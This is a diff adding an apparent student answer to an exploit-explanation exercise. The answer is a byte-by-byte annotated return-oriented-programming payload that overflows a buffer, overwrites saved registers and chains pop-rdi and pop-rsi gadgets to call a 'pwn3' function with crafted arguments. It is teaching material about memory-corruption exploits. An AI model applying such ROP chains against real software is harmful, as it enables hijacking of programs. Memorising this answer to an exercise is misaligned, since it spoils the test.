@@ -1,2 +1,18 @@
 Q. Your exploit explanation below.
 
+36 36 36 36 36 36 36 36 - Padding to fill buffer until next "explaination"
+36 36 36 36 36 36 36 36
+36 36 36 36 36 36 36 36
+36 36 36 36 36 36 36 36
+36 36 36 36 36 36 36 36
+36 36 36 36 36 36 36 36
+36 36 36 36 36 36 36 36 - padding to fill buffer
+36 36 36 36 36 36 36 36 - padding for r12 on stack (callee save)
+36 39 36 36 36 36 36 36 - padding to save rbp on stack (callee save)
+24 36 40 00 00 00 00 00 - address to gadget pop rdi, ret (0x403624)
+d4 00 00 00 00 00 00 00 - Argument for pop rdi (212, or 0xd4)
+5e bc 40 00 00 00 00 00 - Address to gadget pop rsi, ret (0x40bc5e)
+b0 ff e7 ff ff 7f 00 00 - Address to the string argument "ph33rm3n00bz" in stack for pop rsi (0x7fffffe7ffb0)
+e5 18 40 00 00 00 00 00 - Address to pwn3 function (0x4018e5)
+70 68 33 33 72 6D 33 6E - The string "ph33rm3n00bz" for argument 2.
+30 30 62 7A             - The string "ph33rm3n00bz", just on a new line
